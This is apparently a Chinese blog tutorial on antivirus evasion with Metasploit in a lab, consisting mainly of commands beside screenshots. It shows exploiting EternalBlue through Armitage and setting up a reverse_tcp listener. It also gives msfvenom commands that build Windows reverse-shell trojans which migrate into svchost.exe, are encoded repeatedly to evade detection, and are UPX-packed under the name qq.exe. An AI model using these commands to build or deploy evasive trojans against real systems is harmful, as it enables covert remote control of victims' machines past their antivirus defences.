## 免杀1

### 1\. 会话提升的几种方式

python -c "import pty;pty.spawn('/bin/bash');" 会话提升

[![wps63](https://image.3001.net/images/20201116/1605507325.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111455682-1595993673.jpg)

session -u 4 将shell会话提升成meterpreter会话

[![wps64](https://image.3001.net/images/20201116/1605507326.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111456406-1078129683.jpg)

[![wps65](https://image.3001.net/images/20201116/1605507326.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111457216-401005117.jpg)

直接修改payload，原来的设置的payload为shell的木马也能连上

[![wps66](https://image.3001.net/images/20201116/1605507327.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111457922-883886579.jpg)

### 2\. armitage的熟悉

apt-get install armitage 安装

[![wps68](https://image.3001.net/images/20201116/1605507328.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111459249-1616508641.jpg)

armitage 进入界面

不用改直接进入

[![wps70](https://image.3001.net/images/20201116/1605507328.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111500753-797602525.jpg)

选择快速查询

[![wps71](https://image.3001.net/images/20201116/1605507329.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111501434-1007367216.jpg)

输入要查询的地址

[![wps72](https://image.3001.net/images/20201116/1605507330.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111502310-1295231567.jpg)

nmap出来存活的主机有（1是物理电脑，2是网关，135是linux靶机，254是广播地址，128是win7靶机，129是本机）

  

[![wps74](https://image.3001.net/images/20201116/1605507330.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111503660-557321553.jpg)

拒绝访问打开服务管理器

[![wps75](https://image.3001.net/images/20201116/1605507331.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111504292-466667046.jpg)

用所有的漏洞进行探测

[![wps77](https://image.3001.net/images/20201116/1605507332.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111505681-1016366116.jpg)

搜索ms17

移过去

[![wps79](https://image.3001.net/images/20201116/1605507333.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111507054-2114119966.jpg)

存在永恒之蓝的漏洞

[![wps80](https://image.3001.net/images/20201116/1605526761.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111507984-27344624.jpg)

进行渗透

[![wps81](https://image.3001.net/images/20201116/1605507334.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111508677-424697835.jpg)

渗透成功

[![wps83](https://image.3001.net/images/20201116/1605507335.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111510449-1453624745.jpg)

  

### 3\. handler生成监听器的方法

[![wps85](https://image.3001.net/images/20201116/1605507336.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111512591-2090016298.jpg)

handler -H 192.168.1.129 -P 4444 -p windows/meterpreter/reverse_tcp  
  
---  
  
  

### 4\. 防止会话假死

show advanced 显示高级参数设置

set ExitOnSession false 监听到shell之后端口继续监听

[![wps87](https://image.3001.net/images/20201116/1605507337.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111514982-1371761802.jpg)

  

[![wps89](https://image.3001.net/images/20201116/1605507338.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111516474-584868943.jpg)

set SessionCommunicationTimeout 0 设置会话存活时间，默认5分钟

  

[![wps91](https://image.3001.net/images/20201116/1605507338.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111517854-881495302.jpg)

set SessionExpirationTimeout 0 设置会话存活时间，默认一星期

[![wps92](https://image.3001.net/images/20201116/1605507339.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111518430-856488477.jpg)

[![wps93](https://image.3001.net/images/20201116/1605507339.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111518998-1399727742.jpg)

[![wps94](https://image.3001.net/images/20201116/1605507341.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111519654-554821027.jpg)

  

### 5\. 控制台设置编码

EnableStageEncoding 是否允许stage进行编码

[![wps96](https://image.3001.net/images/20201116/1605507342.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111520888-1335842037.jpg)

StageEncoder 设置要用的编码

优秀的编码：x86/shikata_ga_nai、cmd/powershell_base64

[![wps98](https://image.3001.net/images/20201116/1605507342.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111522018-465088408.jpg)

### 6\. upx加壳

加壳

[![wps99](https://image.3001.net/images/20201116/1605507343.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111522652-945189882.jpg)

upx -9 qq.exe

-1压缩更快 -9压缩更好

-d解压 -l列表压缩文件

-t测试压缩文件 -V显示版本号

-h给予更多帮助 -L显示软件许可证  
  
---  
  
测试压缩文件能否运行

[![wps100](https://image.3001.net/images/20201116/1605507344.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111523310-812118424.jpg)

upx -t qq.com OK表示可以运行  
  
---  
  
[回到顶部](https://www.cnblogs.com/caihon/p/13957744.html#_labelTop)

### 7\. msfvenom木马payload持久化

（会在运行木马的时候自动迁移到svchost.exe的对应进程中去）

[![wps101](https://image.3001.net/images/20201116/1605507344.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111523913-1695485568.jpg)

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.129 lport=4444
PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o shell.exe  
  
---  
  
[回](https://www.cnblogs.com/caihon/p/13957744.html#_labelTop)

### 8\. msfvenom木马编码

[![wps102](https://image.3001.net/images/20201116/1605507345.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111524581-1243449803.jpg)

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.227.129 lport=4444
-e cmd/powershell_base64 -i 14 -f exe -o shell.exe  
  
---
